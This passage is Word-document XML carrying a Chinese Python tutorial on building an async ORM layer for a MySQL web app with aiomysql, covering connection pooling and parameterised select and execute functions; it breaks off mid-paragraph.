    <w:p w14:paraId="5BF01A9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password ==&gt; ('password', 'varchar(30)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25385D3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name ==&gt; ('username', 'varchar(30)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5C91F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email ==&gt; ('email', 'varchar(30)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4059B20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SQL: insert into User (email,uid,password,username) values ('test@orm.org',12345,'my-pwd','Michael')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0EF6EE" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="50"/>
          <w:szCs w:val="50"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="50"/>
          <w:szCs w:val="50"/>
        </w:rPr>
        <w:t xml:space="preserve">Day 3 - </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="50"/>
          <w:szCs w:val="50"/>
        </w:rPr>
        <w:t>编写</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="50"/>
          <w:szCs w:val="50"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7523DA21" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing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在一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web App</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，所有数据，包括用户信息、发布的日志、评论等，都存储在数据库中。在</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>awesome-python3-webapp</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，我们选择</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作为数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7423BD"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Web App</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里面有很多地方都要访问数据库。访问数据库需要创建数据库连接、游标对象，然后执行</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语句，最后处理异常，清理资源。这些访问数据库的代码如果分散到各个函数中，势必无法维护，也不利于代码复用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318BFE53"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所以，我们要首先把常用的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SELECT</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INSERT</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UPDATE</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>操作用函数封装起来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A888F2"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由于</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架使用了基于</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>asyncio</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>aiohttp</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，这是基于协程的异步模型。在协程中，不能调用普通的同步</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操作，因为所有用户都是由一个线程服务的，协程的执行速度必须非常快，才能处理大量用户的请求。而耗时的</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操作不能在协程中以同步的方式调用，否则，等待一个</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操作时，系统无法响应任何其他用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769AA119"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这就是异步编程的一个原则：一旦决定使用异步，则系统每一层都必须是异步，</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开弓没有回头箭</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25233F95"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幸运的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>aiomysql</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据库提供了异步</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的驱动。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544B0893" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="375" w:after="225" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>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创建连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D94DA40"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我们需要创建一个全局的连接池，每个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求都可以从连接池中直接获取数据库连接。使用连接池的好处是不必频繁地打开和关闭数据库连接，而是能复用就尽量复用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3285A3D7"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lastRenderedPageBreak/>
        <w:t>连接池由全局变量</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>__pool</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>存储，缺省情况下将编码设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>utf8</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，自动提交事务：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEB39BC"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@asyncio.coroutine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A12B7D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def create_pool(loop, **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B23851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logging.info('create database connection pool...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB51F2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global __pool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B79725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__pool = yield from aiomysql.create_pool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D25270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host=kw.get('host', 'localhost'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65576886"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port=kw.get('port', 3306),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6551B7D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user=kw['user'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B079BA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password=kw['password'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEB7E5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db=kw['db'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5A57D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charset=kw.get('charset', 'utf8'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE8F8EC"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autocommit=kw.get('autocommit', True),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A24E7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maxsize=kw.get('maxsize', 10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA86E0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minsize=kw.get('minsize', 1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379159E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loop=loop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E33EE9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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09548BEB" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>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Select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B887C48" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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要执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句，我们用</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函数执行，需要传入</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语句和</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参数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E149BB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@asyncio.coroutine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A59E5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def select(sql, args, size=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B8E6B8"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log(sql, args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B77FCA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global __pool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552399E2"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with (yield from __pool) as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D3546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cur = yield from conn.cursor(aiomysql.DictCursor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335AFE4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yield from cur.execute(sql.replace('?', '%s'), args or ())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DA402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size:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DC5896"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rs = yield from cur.fetchmany(size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373F375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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3B4EC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rs = yield from cur.fetchall()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71496B3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yield from cur.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A3687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logging.info('rows returned: %s' % len(rs))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEC43C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rs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F0DDE5"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lastRenderedPageBreak/>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句的占位符是</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，而</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的占位符是</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>%s</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函数在内部自动替换。注意要始终坚持使用带参数的</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，而不是自己拼接</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字符串，这样可以防止</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注入攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447D614C"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注意到</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>yield from</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将调用一个子协程（也就是在一个协程中调用另一个协程）并直接获得子协程的返回结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190A88EA"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如果传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数，就通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>fetchmany()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>获取最多指定数量的记录，否则，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>fetchall()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>获取所有记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4433267D" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="320" w:lineRule="exact"/>
        <w:contextualSpacing/>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Insert, Update, Delete</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79586D10"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要执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>INSERT</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UPDATE</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DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句，可以定义一个通用的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>execute()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数，因为这</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>种</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的执行都需要相同的参数，以及返回一个整数表示影响的行数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505CEEF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@asyncio.coroutine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1848E9E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def execute(sql, args):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4041164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log(sql)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C00B52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with (yield from __pool) as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6233643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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6897E51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cur = yield from conn.cursor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263CD17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yield from cur.execute(sql.replace('?', '%s'), args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063D875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affected = cur.rowcount</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017E1A22"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yield from cur.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBD31B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except BaseException as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2814A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raise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22ACA58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affected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54561C1B"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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>execute()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数和</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函数所不同的是，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cursor</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
